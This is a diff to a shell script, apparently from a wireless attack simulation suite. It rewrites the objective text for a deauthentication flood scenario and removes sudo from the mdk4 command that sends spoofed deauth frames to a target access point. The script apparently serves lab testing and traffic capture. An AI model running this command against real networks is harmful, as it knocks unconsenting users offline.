@@ -23,7 +23,9 @@ print_none "Tool:          $SCN_TOOL"
 print_none "Mode:          $SCN_MODE"
 print_blank
 print_wrapped_indent "Objective: " \
-"This scenario simulates a high-volume deauth flood intended to forcibly disconnect clients from an AP."
+"This scenario simulates a Deauthentication Flood, a common denial-of-service (DoS) attack. The script uses mdk4 to send a high volume of spoofed deauthentication frames that appear to originate from the target access point.
+
+This forces all connected clients to disconnect, disrupting network services. The goal is to capture this flood of management frames and the resulting client disconnections."
 print_line
 
 confirmation
@@ -61,7 +63,7 @@ print_section "Simulation"
 
 ensure_monitor_mode
 print_waiting "Running"
-sudo timeout "$SCN_DURATION" mdk4 "$INTERFACE" d -B "$SCN_BSSID" -c "$SCN_CHANNEL"
+timeout "$SCN_DURATION" mdk4 "$INTERFACE" d -B "$SCN_BSSID" -c "$SCN_CHANNEL"
 EXIT_CODE=$?
 ensure_managed_mode
 
